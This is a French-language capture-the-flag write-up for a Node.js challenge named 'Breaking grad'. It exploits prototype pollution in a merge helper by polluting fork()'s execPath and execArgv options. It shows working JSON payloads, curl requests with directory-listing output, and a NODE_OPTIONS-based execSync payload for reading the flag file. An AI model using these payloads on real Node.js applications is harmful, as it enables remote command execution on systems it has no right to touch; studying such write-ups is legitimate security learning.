\section{Breaking grad}

keywords: prototype pollution

Node :(

le flag est nommé aléatoirement donc il va falloir pouvoir rce ou au moins ls


donc 2 endpoints
\begin{itemize}
    \item \verb+/debug/:action+ en get
    \item \verb+api/calculate+ en post
\end{itemize}

en regardant \verb+Object.Helper+ pour la méthode \verb+clone+

ca fait appel à une fonction recursive de \verb+merge+ qui semble fusioner
l'input avec \verb+{}+ en interdisant \verb+__proto__+

comprend pas donc recherche conduisent à la notion de  {\em prototype pollution}

et on retrouve ce challenge en demo qui lead vers du RCE.

donc en substance on peut faire un prototype pollution avec sur
\verb+/api/calculate+ et dans la partie \verb+action+

on exploit \verb+fork+.

\begin{verbatim}
The child_process.fork() method is a special case of child_process.spawn() used
specifically to spawn new Node.js processes. Like child_process.spawn(), a
ChildProcess object is returned. The returned ChildProcess will have an
additional communication channel built-in that allows messages to be passed
back and forth between the parent and child. See subprocess.send() for
details.
\end{verbatim}

\begin{verbatim}
child_process.fork(modulePath[, args][, options])

avec:
    options:
        execPath <string> Executable used to create the child process.
        execArgv <string[]> List of string arguments passed to the executable. Default: process.execArgv.
\end{verbatim}

or l'appel de fork ne défini pas ces options:
\begin{verbatim}
let proc = fork('VersionCheck.js', [], {
    stdio: ['ignore', 'pipe', 'pipe', 'ipc']
});
\end{verbatim}


et donc
payload pour leak le nom du flag

\begin{verbatim}
{
    "constructor": {"prototype": {"execPath": "ls", "execArgv": ["-l", "."]}}
}
\end{verbatim}

\begin{verbatim}
$ curl -XPOST http://188.166.148.162:31460/api/calculate \
    -H 'Content-Type: application/json' \
    -d '{"constructor": {"prototype": {"execPath": "ls", "execArgv": ["-l", "."]}}}'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>RangeError: Maximum call stack size exceeded<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:10:10)<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:14:26)<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:14:26)<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:14:26)<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:14:26)<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:14:26)<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:14:26)<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:14:26)<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:14:26)<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:14:26)</pre>
</body>
</html>

$ curl http://188.166.148.162:31460/debug/version
-rw-r--r-- 1 root root  318 Jun 26  2020 VersionCheck.js

.:
total 52
-rw-r--r--  1 root root   318 Jun 26  2020 VersionCheck.js
-rw-r--r--  1 root root    43 Jun 26  2020 flag_e1T6f
drwxr-xr-x  2 root root  4096 Jun 26  2020 helpers
-rw-r--r--  1 root root   490 Jun 26  2020 index.js
drwxr-xr-x 56 root root  4096 Jun 26  2020 node_modules
-rw-r--r--  1 root root 14241 Jun 26  2020 package-lock.json
-rw-r--r--  1 root root   409 Jun 26  2020 package.json
drwxr-xr-x  2 root root  4096 Jun 26  2020 routes
drwxr-xr-x  5 root root  4096 Jun 26  2020 static
drwxr-xr-x  2 root root  4096 Jun 26  2020 views

\end{verbatim}


bb pour obtenir le flag
\begin{verbatim}
{
    "constructor": {"prototype": {"execPath": "cat", "execArgv": ["flag_xxx"]}}
}
\end{verbatim}


un autre payload possible

\begin{verbatim}
{“constructor”: {“prototype”: {“env”: {“x”: “console.log(require(\”child_process\”).execSync(\”cat flag_xxxxx\”).toString())//”}, “NODE_OPTIONS”: “ — require /proc/self/environ”}}}
\end{verbatim}
